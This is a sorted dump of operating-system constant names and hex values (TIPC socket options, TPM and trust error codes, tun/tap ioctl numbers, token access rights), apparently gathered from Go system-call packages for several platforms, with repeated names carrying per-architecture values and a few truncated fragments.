TIPC_CONN_SHUTDOWN                          = 0x5
TIPC_CONN_TIMEOUT                           = 0x82
TIPC_CRITICAL_IMPORTANCE                    = 0x3
TIPC_DESTNAME                               = 0x3
TIPC_DEST_DROPPABLE                         = 0x81
TIPC_ERRINFO                                = 0x1
TIPC_ERR_NO_NAME                            = 0x1
TIPC_ERR_NO_NODE                            = 0x3
TIPC_ERR_NO_PORT                            = 0x2
TIPC_ERR_OVERLOAD                           = 0x4
TIPC_GROUP_JOIN                             = 0x87
TIPC_GROUP_LEAVE                            = 0x88
TIPC_GROUP_LOOPBACK                         = 0x1
TIPC_GROUP_MEMBER_EVTS                      = 0x2
TIPC_HIGH_IMPORTANCE                        = 0x2
TIPC_IMPORTANCE                             = 0x7f
TIPC_LINK_STATE                             = 0x2
TIPC_LOW_IMPORTANCE                         = 0x0
TIPC_MAX_BEARER_NAME                        = 0x20
TIPC_MAX_IF_NAME                            = 0x10
TIPC_MAX_LINK_NAME                          = 0x44
TIPC_MAX_MEDIA_NAME                         = 0x10
TIPC_MAX_USER_MSG_SIZE                      = 0x101d0
TIPC_MCAST_BROADCAST                        = 0x85
TIPC_MCAST_REPLICAST                        = 0x86
TIPC_MEDIUM_IMPORTANCE                      = 0x1
TIPC_NODEID_LEN                             = 0x10
TIPC_NODELAY                                = 0x8a
TIPC_NODE_BITS                              = 0xc
TIPC_NODE_MASK                              = 0xfff
TIPC_NODE_OFFSET                            = 0x0
TIPC_NODE_RECVQ_DEPTH                       = 0x83
TIPC_NODE_SCOPE    = 0x3
TIPC_NODE_SIZE                              = 0xfff
TIPC_NODE_STATE                             = 0x0
TIPC_OK                                     = 0x0
TIPC_PUBLISHED                              = 0x1
TIPC_REKEYING_NOW                           = 0xffffffff
TIPC_RESERVED_TYPES                         = 0x40
TIPC_RETDATA                                = 0x2
TIPC_SERVICE_ADDR                           = 0x2
TIPC_SERVICE_RANGE                          = 0x1
TIPC_SOCKET_ADDR                            = 0x3
TIPC_SOCK_RECVQ_DEPTH                       = 0x84
TIPC_SOCK_RECVQ_USED                        = 0x89
TIPC_SRC_DROPPABLE                          = 0x80
TIPC_SUBSCR_TIMEOUT                         = 0x3
TIPC_SUB_CANCEL                             = 0x4
TIPC_SUB_PORTS                              = 0x1
TIPC_SUB_SERVICE                            = 0x2
TIPC_TOP_SRV                                = 0x1
TIPC_WAIT_FOREVER                           = 0xffffffff
TIPC_WITHDRAWN                              = 0x2
TIPC_ZONE_BITS                              = 0x8
TIPC_ZONE_CLUSTER_MASK                      = 0xfffff000
TIPC_ZONE_MASK                              = 0xff000000
TIPC_ZONE_OFFSET                            = 0x18
TIPC_ZONE_SCOPE                             = 0x1
TIPC_ZONE_SIZE                              = 0xff
TMPFS_MAGIC                                 = 0x1021994
TOKEN_ADJUST_DEFAULT
TOKEN_ADJUST_DEFAULT 
TOKEN_ADJUST_GROUPS
TOKEN_ADJUST_GROUPS 
TOKEN_ADJUST_PRIVILEGES
TOKEN_ADJUST_PRIVILEGES 
TOKEN_ADJUST_SESSIONID
TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED 
TOKEN_ASSIGN_PRIMARY 
TOKEN_ASSIGN_PRIMARY = 1 << iota
TOKEN_DUPLICATE
TOKEN_DUPLICATE 
TOKEN_EXECUTE = STANDARD_RIGHTS_EXECUTE
TOKEN_IMPERSONATE
TOKEN_IMPERSONATE 
TOKEN_QUERY
TOKEN_QUERY 
TOKEN_QUERY_SOURCE
TOKEN_QUERY_SOURCE 
TOKEN_READ  = STANDARD_RIGHTS_READ 
TOKEN_WRITE = STANDARD_RIGHTS_WRITE 
TOSTOP                                  = 0x400000
TOSTOP                            = 0x400000
TOSTOP                           = 0x100
TOSTOP                           = 0x400000
TOSTOP                           = 0x8000
TOSTOP                         = 0x400000
TOSTOP                        = 0x100
TOSTOP                        = 0x10000
TPACKET_ALIGNMENT                           = 0x10
TPACKET_HDRLEN                              = 0x34
TPACKET_V1 = 0x0
TPACKET_V2 = 0x1
TPACKET_V3 = 0x2
TPC_E_INITIALIZE_FAIL                                                     Handle        = 0x80040223
TPC_E_INVALID_CONFIGURATION                                               Handle        = 0x80040239
TPC_E_INVALID_DATA_FROM_RECOGNIZER                                        Handle        = 0x8004023A
TPC_E_INVALID_INPUT_RECT                                                  Handle        = 0x80040219
TPC_E_INVALID_PACKET_DESCRIPTION                                          Handle        = 0x80040233
TPC_E_INVALID_PROPERTY                                                    Handle        = 0x80040241
TPC_E_INVALID_RIGHTS                                                      Handle        = 0x80040236
TPC_E_INVALID_STROKE                                                      Handle        = 0x80040222
TPC_E_NOT_RELEVANT                                                        Handle        = 0x80040232
TPC_E_NO_DEFAULT_TABLET                                                   Handle        = 0x80040212
TPC_E_OUT_OF_ORDER_CALL                                                   Handle        = 0x80040237
TPC_E_QUEUE_FULL                                                          Handle        = 0x80040238
TPC_E_RECOGNIZER_NOT_REGISTERED                                           Handle        = 0x80040235
TPC_E_UNKNOWN_PROPERTY                                                    Handle        = 0x8004021B
TPC_S_INTERRUPTED                                                         Handle        = 0x00040253
TPC_S_NO_DATA_TO_PROCESS                                                  Handle        = 0x00040254
TPC_S_TRUNCATED                                                           Handle        = 0x00040252
TPIO           uint8
TPMAPI_E_ACCESS_DENIED                                                    Handle        = 0x80290108
TPMAPI_E_AUTHORIZATION_FAILED                                             Handle        = 0x80290109
TPMAPI_E_AUTHORIZATION_REVOKED                                            Handle        = 0x80290126
TPMAPI_E_AUTHORIZING_KEY_NOT_SUPPORTED                                    Handle        = 0x80290128
TPMAPI_E_BUFFER_TOO_SMALL                                                 Handle        = 0x80290106
TPMAPI_E_EMPTY_TCG_LOG                                                    Handle        = 0x8029011A
TPMAPI_E_ENCRYPTION_FAILED                                                Handle        = 0x80290110
TPMAPI_E_ENDORSEMENT_AUTH_NOT_NULL                                        Handle        = 0x80290125
TPMAPI_E_FIPS_RNG_CHECK_FAILED                                            Handle        = 0x80290119
TPMAPI_E_INTERNAL_ERROR                                                   Handle        = 0x80290107
TPMAPI_E_INVALID_AUTHORIZATION_SIGNATURE                                  Handle        = 0x80290129
TPMAPI_E_INVALID_CONTEXT_HANDLE                                           Handle        = 0x8029010A
TPMAPI_E_INVALID_CONTEXT_PARAMS                                           Handle        = 0x80290115
TPMAPI_E_INVALID_DELEGATE_BLOB                                            Handle        = 0x80290114
TPMAPI_E_INVALID_ENCODING                                                 Handle        = 0x8029010E
TPMAPI_E_INVALID_KEY_BLOB                                                 Handle        = 0x80290116
TPMAPI_E_INVALID_KEY_PARAMS                                               Handle        = 0x80290111
TPMAPI_E_INVALID_KEY_SIZE                                                 Handle        = 0x8029010F
TPMAPI_E_INVALID_MIGRATION_AUTHORIZATION_BLOB                             Handle        = 0x80290112
TPMAPI_E_INVALID_OUTPUT_POINTER                                           Handle        = 0x80290103
TPMAPI_E_INVALID_OWNER_AUTH                                               Handle        = 0x80290118
TPMAPI_E_INVALID_PARAMETER                                                Handle        = 0x80290104
TPMAPI_E_INVALID_PCR_DATA                                                 Handle        = 0x80290117
TPMAPI_E_INVALID_PCR_INDEX                                                Handle        = 0x80290113
TPMAPI_E_INVALID_STATE                                                    Handle        = 0x80290100
TPMAPI_E_INVALID_TCG_LOG_ENTRY                                            Handle        = 0x8029011B
TPMAPI_E_MALFORMED_AUTHORIZATION_KEY                                      Handle        = 0x80290127
TPMAPI_E_MALFORMED_AUTHORIZATION_OTHER                                    Handle        = 0x8029012B
TPMAPI_E_MALFORMED_AUTHORIZATION_POLICY                                   Handle        = 0x8029012A
TPMAPI_E_MESSAGE_TOO_LARGE                                                Handle        = 0x8029010D
TPMAPI_E_NOT_ENOUGH_DATA                                                  Handle        = 0x80290101
TPMAPI_E_NO_AUTHORIZATION_CHAIN_FOUND                                     Handle        = 0x80290122
TPMAPI_E_NV_BITS_NOT_DEFINED                                              Handle        = 0x8029011F
TPMAPI_E_NV_BITS_NOT_READY                                                Handle        = 0x80290120
TPMAPI_E_OUT_OF_MEMORY                                                    Handle        = 0x80290105
TPMAPI_E_OWNER_AUTH_NOT_NULL                                              Handle        = 0x80290124
TPMAPI_E_POLICY_DENIES_OPERATION                                          Handle        = 0x8029011E
TPMAPI_E_SEALING_KEY_CHANGED                                              Handle        = 0x8029012C
TPMAPI_E_SEALING_KEY_NOT_AVAILABLE                                        Handle        = 0x80290121
TPMAPI_E_SVN_COUNTER_NOT_AVAILABLE                                        Handle        = 0x80290123
TPMAPI_E_TBS_COMMUNICATION_ERROR                                          Handle        = 0x8029010B
TPMAPI_E_TCG_INVALID_DIGEST_ENTRY                                         Handle        = 0x8029011D
TPMAPI_E_TCG_SEPARATOR_ABSENT                                             Handle        = 0x8029011C
TPMAPI_E_TOO_MUCH_DATA                                                    Handle        = 0x80290102
TPMAPI_E_TPM_COMMAND_ERROR                                                Handle        = 0x8029010C
TPM_20_E_ASYMMETRIC                                                       Handle        = 0x80280081
TPM_20_E_ATTRIBUTES                                                       Handle        = 0x80280082
TPM_20_E_AUTHSIZE                                                         Handle        = 0x80280144
TPM_20_E_AUTH_CONTEXT                                                     Handle        = 0x80280145
TPM_20_E_AUTH_FAIL                                                        Handle        = 0x8028008E
TPM_20_E_AUTH_MISSING                                                     Handle        = 0x80280125
TPM_20_E_AUTH_TYPE                                                        Handle        = 0x80280124
TPM_20_E_AUTH_UNAVAILABLE                                                 Handle        = 0x8028012F
TPM_20_E_BAD_AUTH                                                         Handle        = 0x802800A2
TPM_20_E_BAD_CONTEXT                                                      Handle        = 0x80280150
TPM_20_E_BINDING                                                          Handle        = 0x802800A5
TPM_20_E_CANCELED                                                         Handle        = 0x80280909
TPM_20_E_COMMAND_CODE                                                     Handle        = 0x80280143
TPM_20_E_COMMAND_SIZE                                                     Handle        = 0x80280142
TPM_20_E_CONTEXT_GAP                                                      Handle        = 0x80280901
TPM_20_E_CPHASH                                                           Handle        = 0x80280151
TPM_20_E_CURVE                                                            Handle        = 0x802800A6
TPM_20_E_DISABLED                                                         Handle        = 0x80280120
TPM_20_E_ECC_CURVE                                                        Handle        = 0x80280123
TPM_20_E_ECC_POINT                                                        Handle        = 0x802800A7
TPM_20_E_EXCLUSIVE                                                        Handle        = 0x80280121
TPM_20_E_EXPIRED                                                          Handle        = 0x802800A3
TPM_20_E_FAILURE                                                          Handle        = 0x80280101
TPM_20_E_HANDLE                                                           Handle        = 0x8028008B
TPM_20_E_HASH                                                             Handle        = 0x80280083
TPM_20_E_HIERARCHY                                                        Handle        = 0x80280085
TPM_20_E_HMAC                                                             Handle        = 0x80280119
TPM_20_E_INITIALIZE                                                       Handle        = 0x80280100
TPM_20_E_INSUFFICIENT                                                     Handle        = 0x8028009A
TPM_20_E_INTEGRITY                                                        Handle        = 0x8028009F
TPM_20_E_KDF                                                              Handle        = 0x8028008C
TPM_20_E_KEY                                                              Handle        = 0x8028009C
TPM_20_E_KEY_SIZE                                                         Handle        = 0x80280087
TPM_20_E_LOCALITY                                                         Handle        = 0x80280907
TPM_20_E_LOCKOUT                                                          Handle        = 0x80280921
TPM_20_E_MEMORY                                                           Handle        = 0x80280904
TPM_20_E_MGF                                                              Handle        = 0x80280088
TPM_20_E_MODE                                                             Handle        = 0x80280089
TPM_20_E_NEEDS_TEST                                                       Handle        = 0x80280153
TPM_20_E_NONCE                                                            Handle        = 0x8028008F
TPM_20_E_NO_RESULT                                                        Handle        = 0x80280154
TPM_20_E_NV_AUTHORIZATION                                                 Handle        = 0x80280149
TPM_20_E_NV_DEFINED                                                       Handle        = 0x8028014C
TPM_20_E_NV_LOCKED                                                        Handle        = 0x80280148
TPM_20_E_NV_RANGE                                                         Handle        = 0x80280146
TPM_20_E_NV_RATE                                                          Handle        = 0x80280920
TPM_20_E_NV_SIZE                                                          Handle        = 0x80280147
TPM_20_E_NV_SPACE                                                         Handle        = 0x8028014B
TPM_20_E_NV_UNAVAILABLE                                                   Handle        = 0x80280923
TPM_20_E_NV_UNINITIALIZED                                                 Handle        = 0x8028014A
TPM_20_E_OBJECT_HANDLES                                                   Handle        = 0x80280906
TPM_20_E_OBJECT_MEMORY                                                    Handle        = 0x80280902
TPM_20_E_PARENT                                                           Handle        = 0x80280152
TPM_20_E_PCR                                                              Handle        = 0x80280127
TPM_20_E_PCR_CHANGED                                                      Handle        = 0x80280128
TPM_20_E_POLICY                                                           Handle        = 0x80280126
TPM_20_E_POLICY_CC                                                        Handle        = 0x802800A4
TPM_20_E_POLICY_FAIL                                                      Handle        = 0x8028009D
TPM_20_E_PP                                                               Handle        = 0x80280090
TPM_20_E_PRIVATE                                                          Handle        = 0x8028010B
TPM_20_E_RANGE                                                            Handle        = 0x8028008D
TPM_20_E_REBOOT                                                           Handle        = 0x80280130
TPM_20_E_RESERVED_BITS                                                    Handle        = 0x802800A1
TPM_20_E_RETRY                                                            Handle        = 0x80280922
TPM_20_E_SCHEME                                                           Handle        = 0x80280092
TPM_20_E_SELECTOR                                                         Handle        = 0x80280098
TPM_20_E_SENSITIVE                                                        Handle        = 0x80280155
TPM_20_E_SEQUENCE                                                         Handle        = 0x80280103
TPM_20_E_SESSION_HANDLES                                                  Handle        = 0x80280905
TPM_20_E_SESSION_MEMORY                                                   Handle        = 0x80280903
TPM_20_E_SIGNATURE                                                        Handle        = 0x8028009B
TPM_20_E_SIZE                                                             Handle        = 0x80280095
TPM_20_E_SYMMETRIC                                                        Handle        = 0x80280096
TPM_20_E_TAG                                                              Handle        = 0x80280097
TPM_20_E_TESTING                                                          Handle        = 0x8028090A
TPM_20_E_TICKET                                                           Handle        = 0x802800A0
TPM_20_E_TOO_MANY_CONTEXTS                                                Handle        = 0x8028012E
TPM_20_E_TYPE                                                             Handle        = 0x8028008A
TPM_20_E_UNBALANCED                                                       Handle        = 0x80280131
TPM_20_E_UPGRADE                                                          Handle        = 0x8028012D
TPM_20_E_VALUE                                                            Handle        = 0x80280084
TPM_20_E_YIELDED                                                          Handle        = 0x80280908
TPM_E_AREA_LOCKED                                                         Handle        = 0x8028003C
TPM_E_ATTESTATION_CHALLENGE_NOT_SET                                       Handle        = 0x80290412
TPM_E_AUDITFAILURE                                                        Handle        = 0x80280004
TPM_E_AUDITFAIL_SUCCESSFUL                                                Handle        = 0x80280031
TPM_E_AUDITFAIL_UNSUCCESSFUL                                              Handle        = 0x80280030
TPM_E_AUTH2FAIL                                                           Handle        = 0x8028001D
TPM_E_AUTHFAIL                                                            Handle        = 0x80280001
TPM_E_AUTH_CONFLICT                                                       Handle        = 0x8028003B
TPM_E_BADCONTEXT                                                          Handle        = 0x8028005A
TPM_E_BADINDEX                                                            Handle        = 0x80280002
TPM_E_BADTAG                                                              Handle        = 0x8028001E
TPM_E_BAD_ATTRIBUTES                                                      Handle        = 0x80280042
TPM_E_BAD_COUNTER                                                         Handle        = 0x80280045
TPM_E_BAD_DATASIZE                                                        Handle        = 0x8028002B
TPM_E_BAD_DELEGATE                                                        Handle        = 0x80280059
TPM_E_BAD_HANDLE                                                          Handle        = 0x80280058
TPM_E_BAD_KEY_PROPERTY                                                    Handle        = 0x80280028
TPM_E_BAD_LOCALITY                                                        Handle        = 0x8028003D
TPM_E_BAD_MIGRATION                                                       Handle        = 0x80280029
TPM_E_BAD_MODE                                                            Handle        = 0x8028002C
TPM_E_BAD_ORDINAL                                                         Handle        = 0x8028000A
TPM_E_BAD_PARAMETER                                                       Handle        = 0x80280003
TPM_E_BAD_PARAM_SIZE                                                      Handle        = 0x80280019
TPM_E_BAD_PRESENCE                                                        Handle        = 0x8028002D
TPM_E_BAD_SCHEME                                                          Handle        = 0x8028002A
TPM_E_BAD_SIGNATURE                                                       Handle        = 0x80280062
TPM_E_BAD_TYPE                                                            Handle        = 0x80280034
TPM_E_BAD_VERSION                                                         Handle        = 0x8028002E
TPM_E_BUFFER_LENGTH_MISMATCH                                              Handle        = 0x8029041E
TPM_E_CLAIM_TYPE_NOT_SUPPORTED                                            Handle        = 0x8029041C
TPM_E_CLEAR_DISABLED                                                      Handle        = 0x80280005
TPM_E_COMMAND_BLOCKED                                                     Handle        = 0x80280400
TPM_E_CONTEXT_GAP                                                         Handle        = 0x80280047
TPM_E_DAA_INPUT_DATA0                                                     Handle        = 0x80280051
TPM_E_DAA_INPUT_DATA1                                                     Handle        = 0x80280052
TPM_E_DAA_ISSUER_SETTINGS                                                 Handle        = 0x80280053
TPM_E_DAA_ISSUER_VALIDITY                                                 Handle        = 0x80280056
TPM_E_DAA_RESOURCES                                                       Handle        = 0x80280050
TPM_E_DAA_STAGE                                                           Handle        = 0x80280055
TPM_E_DAA_TPM_SETTINGS                                                    Handle        = 0x80280054
TPM_E_DAA_WRONG_W                                                         Handle        = 0x80280057
TPM_E_DEACTIVATED                                                         Handle        = 0x80280006
TPM_E_DECRYPT_ERROR                                                       Handle        = 0x80280021
TPM_E_DEFEND_LOCK_RUNNING                                                 Handle        = 0x80280803
TPM_E_DELEGATE_ADMIN                                                      Handle        = 0x8028004D
TPM_E_DELEGATE_FAMILY                                                     Handle        = 0x8028004C
TPM_E_DELEGATE_LOCK                                                       Handle        = 0x8028004B
TPM_E_DISABLED                                                            Handle        = 0x80280007
TPM_E_DISABLED_CMD                                                        Handle        = 0x80280008
TPM_E_DOING_SELFTEST                                                      Handle        = 0x80280802
TPM_E_DUPLICATE_VHANDLE                                                   Handle        = 0x80280402
TPM_E_EMBEDDED_COMMAND_BLOCKED                                            Handle        = 0x80280403
TPM_E_EMBEDDED_COMMAND_UNSUPPORTED                                        Handle        = 0x80280404
TPM_E_ENCRYPT_ERROR                                                       Handle        = 0x80280020
TPM_E_ERROR_MASK                                                          Handle        = 0x80280000
TPM_E_FAIL                                                                Handle        = 0x80280009
TPM_E_FAILEDSELFTEST                                                      Handle        = 0x8028001C
TPM_E_FAMILYCOUNT                                                         Handle        = 0x80280040
TPM_E_INAPPROPRIATE_ENC                                                   Handle        = 0x8028000E
TPM_E_INAPPROPRIATE_SIG                                                   Handle        = 0x80280027
TPM_E_INSTALL_DISABLED                                                    Handle        = 0x8028000B
TPM_E_INVALID_AUTHHANDLE                                                  Handle        = 0x80280022
TPM_E_INVALID_FAMILY                                                      Handle        = 0x80280037
TPM_E_INVALID_HANDLE                                                      Handle        = 0x80280401
TPM_E_INVALID_KEYHANDLE                                                   Handle        = 0x8028000C
TPM_E_INVALID_KEYUSAGE                                                    Handle        = 0x80280024
TPM_E_INVALID_PCR_INFO                                                    Handle        = 0x80280010
TPM_E_INVALID_POSTINIT                                                    Handle        = 0x80280026
TPM_E_INVALID_RESOURCE                                                    Handle        = 0x80280035
TPM_E_INVALID_STRUCTURE                                                   Handle        = 0x80280043
TPM_E_IOERROR                                                             Handle        = 0x8028001F
TPM_E_KEYNOTFOUND                                                         Handle        = 0x8028000D
TPM_E_KEY_ALREADY_FINALIZED                                               Handle        = 0x80290414
TPM_E_KEY_NOTSUPPORTED                                                    Handle        = 0x8028003A
TPM_E_KEY_NOT_AUTHENTICATED                                               Handle        = 0x80290418
TPM_E_KEY_NOT_FINALIZED                                                   Handle        = 0x80290411
TPM_E_KEY_NOT_LOADED                                                      Handle        = 0x8029040F
TPM_E_KEY_NOT_SIGNING_KEY                                                 Handle        = 0x8029041A
TPM_E_KEY_OWNER_CONTROL                                                   Handle        = 0x80280044
TPM_E_KEY_USAGE_POLICY_INVALID                                            Handle        = 0x80290416
TPM_E_KEY_USAGE_POLICY_NOT_SUPPORTED                                      Handle        = 0x80290415
TPM_E_LOCKED_OUT                                                          Handle        = 0x8029041B
TPM_E_MAXNVWRITES                                                         Handle        = 0x80280048
TPM_E_MA_AUTHORITY                                                        Handle        = 0x8028005F
TPM_E_MA_DESTINATION                                                      Handle        = 0x8028005D
TPM_E_MA_SOURCE                                                           Handle        = 0x8028005E
TPM_E_MA_TICKET_SIGNATURE                                                 Handle        = 0x8028005C
TPM_E_MIGRATEFAIL                                                         Handle        = 0x8028000F
TPM_E_NEEDS_SELFTEST                                                      Handle        = 0x80280801
TPM_E_NOCONTEXTSPACE                                                      Handle        = 0x80280063
TPM_E_NOOPERATOR                                                          Handle        = 0x80280049
TPM_E_NOSPACE                                                             Handle        = 0x80280011
TPM_E_NOSRK                                                               Handle        = 0x80280012
TPM_E_NOTFIPS                                                             Handle        = 0x80280036
TPM_E_NOTLOCAL                                                            Handle        = 0x80280033
TPM_E_NOTRESETABLE                                                        Handle        = 0x80280032
TPM_E_NOTSEALED_BLOB                                                      Handle        = 0x80280013
TPM_E_NOT_FULLWRITE                                                       Handle        = 0x80280046
TPM_E_NOT_PCR_BOUND                                                       Handle        = 0x80290413
TPM_E_NO_ENDORSEMENT                                                      Handle        = 0x80280023
TPM_E_NO_KEY_CERTIFICATION                                                Handle        = 0x80290410
TPM_E_NO_NV_PERMISSION                                                    Handle        = 0x80280038
TPM_E_NO_WRAP_TRANSPORT                                                   Handle        = 0x8028002F
TPM_E_OWNER_CONTROL                                                       Handle        = 0x8028004F
TPM_E_OWNER_SET                                                           Handle        = 0x80280014
TPM_E_PCP_AUTHENTICATION_FAILED                                           Handle        = 0x80290408
TPM_E_PCP_AUTHENTICATION_IGNORED                                          Handle        = 0x80290409
TPM_E_PCP_BUFFER_TOO_SMALL                                                Handle        = 0x80290406
TPM_E_PCP_DEVICE_NOT_READY                                                Handle        = 0x80290401
TPM_E_PCP_ERROR_MASK                                                      Handle        = 0x80290400
TPM_E_PCP_FLAG_NOT_SUPPORTED                                              Handle        = 0x80290404
TPM_E_PCP_IFX_RSA_KEY_CREATION_BLOCKED                                    Handle        = 0x8029041F
TPM_E_PCP_INTERNAL_ERROR                                                  Handle        = 0x80290407
TPM_E_PCP_INVALID_HANDLE                                                  Handle        = 0x80290402
TPM_E_PCP_INVALID_PARAMETER                                               Handle        = 0x80290403
TPM_E_PCP_KEY_HANDLE_INVALIDATED                                          Handle        = 0x80290422
TPM_E_PCP_KEY_NOT_AIK                                                     Handle        = 0x80290419
TPM_E_PCP_NOT_SUPPORTED                                                   Handle        = 0x80290405
TPM_E_PCP_POLICY_NOT_FOUND                                                Handle        = 0x8029040A
TPM_E_PCP_PROFILE_NOT_FOUND                                               Handle        = 0x8029040B
TPM_E_PCP_RAW_POLICY_NOT_SUPPORTED                                        Handle        = 0x80290421
TPM_E_PCP_TICKET_MISSING                                                  Handle        = 0x80290420
TPM_E_PCP_UNSUPPORTED_PSS_SALT                                            Handle        = 0x40290423
TPM_E_PCP_VALIDATION_FAILED                                               Handle        = 0x8029040C
TPM_E_PCP_WRONG_PARENT                                                    Handle        = 0x8029040E
TPM_E_PERMANENTEK                                                         Handle        = 0x80280061
TPM_E_PER_NOWRITE                                                         Handle        = 0x8028003F
TPM_E_PPI_ACPI_FAILURE                                                    Handle        = 0x80290300
TPM_E_PPI_BIOS_FAILURE                                                    Handle        = 0x80290302
TPM_E_PPI_BLOCKED_IN_BIOS                                                 Handle        = 0x80290304
TPM_E_PPI_NOT_SUPPORTED                                                   Handle        = 0x80290303
TPM_E_PPI_USER_ABORT                                                      Handle        = 0x80290301
TPM_E_READ_ONLY                                                           Handle        = 0x8028003E
TPM_E_REQUIRES_SIGN                                                       Handle        = 0x80280039
TPM_E_RESOURCEMISSING                                                     Handle        = 0x8028004A
TPM_E_RESOURCES                                                           Handle        = 0x80280015
TPM_E_RETRY                                                               Handle        = 0x80280800
TPM_E_SHA_ERROR                                                           Handle        = 0x8028001B
TPM_E_SHA_THREAD                                                          Handle        = 0x8028001A
TPM_E_SHORTRANDOM                                                         Handle        = 0x80280016
TPM_E_SIZE                                                                Handle        = 0x80280017
TPM_E_SOFT_KEY_ERROR                                                      Handle        = 0x80290417
TPM_E_TOOMANYCONTEXTS                                                     Handle        = 0x8028005B
TPM_E_TRANSPORT_NOTEXCLUSIVE                                              Handle        = 0x8028004E
TPM_E_VERSION_NOT_SUPPORTED                                               Handle        = 0x8029041D
TPM_E_WRITE_LOCKED                                                        Handle        = 0x80280041
TPM_E_WRONGPCRVAL                                                         Handle        = 0x80280018
TPM_E_WRONG_ENTITYTYPE                                                    Handle        = 0x80280025
TPM_E_ZERO_EXHAUST_ENABLED                                                Handle        = 0x80290500
TP_STATUS_/ 
TP_STATUS_AVAILABLE                         = 0x0
TP_STATUS_BLK_TMO                           = 0x20
TP_STATUS_COPY                              = 0x2
TP_STATUS_CSUMNOTREADY                      = 0x8
TP_STATUS_CSUM_VALID                        = 0x80
TP_STATUS_KERNEL                            = 0x0
TP_STATUS_LOSING                            = 0x4
TP_STATUS_SENDING                           = 0x2
TP_STATUS_SEND_REQUEST                      = 0x1
TP_STATUS_TS_RAW_HARDWARE                   = 0x80000000
TP_STATUS_TS_SOFTWARE                       = 0x20000000
TP_STATUS_TS_SYS_HARDWARE                   = 0x40000000
TP_STATUS_USER                              = 0x1
TP_STATUS_VLAN_TPID_VALID                   = 0x40
TP_STATUS_VLAN_VALID                        = 0x10
TP_STATUS_WRONG_FORMAT                      = 0x4
TRACEFS_MAGIC                               = 0x74726163
TRAP_BRKPT = 0x1
TRAP_TRACE = 0x2
TRUNCATE_EXISTING = 5
TRUSTEE
TRUSTEE_BAD_FORM            = 2
TRUSTEE_IS_ALIAS            = 4
TRUSTEE_IS_COMPUTER         = 8
TRUSTEE_IS_DELETED          = 6
TRUSTEE_IS_DOMAIN           = 3
TRUSTEE_IS_GROUP            = 2
TRUSTEE_IS_IMPERSONATE = 1
TRUSTEE_IS_INVALID          = 7
TRUSTEE_IS_NAME             = 1
TRUSTEE_IS_OBJECTS_AND_NAME = 4
TRUSTEE_IS_OBJECTS_AND_SID  = 3
TRUSTEE_IS_SID              = 0
TRUSTEE_IS_UNKNOWN          = 0
TRUSTEE_IS_USER             = 1
TRUSTEE_IS_WELL_KNOWN_GROUP = 5
TRUST_E_ACTION_UNKNOWN                                                    Handle        = 0x800B0002
TRUST_E_BAD_DIGEST                                                        Handle        = 0x80096010
TRUST_E_BASIC_CONSTRAINTS                                                 Handle        = 0x80096019
TRUST_E_CERT_SIGNATURE                                                    Handle        = 0x80096004
TRUST_E_COUNTER_SIGNER                                                    Handle        = 0x80096003
TRUST_E_EXPLICIT_DISTRUST                                                 Handle        = 0x800B0111
TRUST_E_FAIL                                                              Handle        = 0x800B010B
TRUST_E_FINANCIAL_CRITERIA                                                Handle        = 0x8009601E
TRUST_E_MALFORMED_SIGNATURE                                               Handle        = 0x80096011
TRUST_E_NOSIGNATURE                                                       Handle        = 0x800B0100
TRUST_E_NO_SIGNER_CERT                                                    Handle        = 0x80096002
TRUST_E_PROVIDER_UNKNOWN                                                  Handle        = 0x800B0001
TRUST_E_SUBJECT_FORM_UNKNOWN                                              Handle        = 0x800B0003
TRUST_E_SUBJECT_NOT_TRUSTED                                               Handle        = 0x800B0004
TRUST_E_SYSTEM_ERROR                                                      Handle        = 0x80096001
TRUST_E_TIME_STAMP                                                        Handle        = 0x80096005
TS)_/ 
TS_COMM_LEN                                 = 0x20
TUN(SET
TUNATTACHFILTER                  = 0x400854d5
TUNATTACHFILTER                  = 0x401054d5
TUNATTACHFILTER                  = 0x800854d5
TUNATTACHFILTER                  = 0x801054d5
TUNDETACHFILTER                  = 0x400854d6
TUNDETACHFILTER                  = 0x401054d6
TUNDETACHFILTER                  = 0x800854d6
TUNDETACHFILTER                  = 0x801054d6
TUNGETDEVNETNS                   = 0x200054e3
TUNGETDEVNETNS                   = 0x54e3
TUNGETFEATURES                   = 0x400454cf
TUNGETFEATURES                   = 0x800454cf
TUNGETFILTER                     = 0x400854db
TUNGETFILTER                     = 0x401054db
TUNGETFILTER                     = 0x800854db
TUNGETFILTER                     = 0x801054db
TUNGETIFF                        = 0x400454d2
TUNGETIFF                        = 0x800454d2
TUNGETSNDBUF                     = 0x400454d3
TUNGETSNDBUF                     = 0x800454d3
TUNGETVNETBE                     = 0x400454df
TUNGETVNETBE                     = 0x800454df
TUNGETVNETHDRSZ                  = 0x400454d7
TUNGETVNETHDRSZ                  = 0x800454d7
TUNGETVNETLE                     = 0x400454dd
TUNGETVNETLE                     = 0x800454dd
TUNNEWPPA = 0x540001
TUNSETCARRIER                    = 0x400454e2
TUNSETCARRIER                    = 0x800454e2
TUNSETDEBUG                      = 0x400454c9
TUNSETDEBUG                      = 0x800454c9
TUNSETFILTEREBPF                 = 0x400454e1
TUNSETFILTEREBPF                 = 0x800454e1
TUNSETGROUP                      = 0x400454ce
TUNSETGROUP                      = 0x800454ce
TUNSETIFF                        = 0x400454ca
TUNSETIFF                        = 0x800454ca
TUNSETIFINDEX                    = 0x400454da
TUNSETIFINDEX                    = 0x800454da
TUNSETLINK                       = 0x400454cd
TUNSETLINK                       = 0x800454cd
TUNSETNOCSUM                     = 0x400454c8
TUNSETNOCSUM                     = 0x800454c8
TUNSETOFFLOAD                    = 0x400454d0
TUNSETOFFLOAD                    = 0x800454d0
TUNSETOWNER                      = 0x400454cc
TUNSETOWNER                      = 0x800454cc
TUNSETPERSIST                    = 0x400454cb
TUNSETPERSIST                    = 0x800454cb
TUNSETPPA = 0x540002
TUNSETQUEUE                      = 0x400454d9
TUNSETQUEUE                      = 0x800454d9
TUNSETSNDBUF                     = 0x400454d4
TUNSETSNDBUF                     = 0x800454d4
TUNSETSTEERINGEBPF               = 0x400454e0
TUNSETSTEERINGEBPF               = 0x800454e0
TUNSETTXFILTER                   = 0x400454d1
TUNSETTXFILTER                   = 0x800454d1
TUNSETVNETBE                     = 0x400454de
TUNSETVNETBE                     = 0x800454de
TUNSETVNETHDRSZ                  = 0x400454d8
TUNSETVNETHDRSZ                  = 0x800454d8
TUNSETVNETLE                     = 0x400454dc
TUNSETVNETLE                     = 0x800454dc
TYPE)
TYPE_E_AMBIGUOUSNAME                                                      Handle        = 0x8002802C
TYPE_E_BADMODULEKIND                                                      Handle        = 0x800288BD
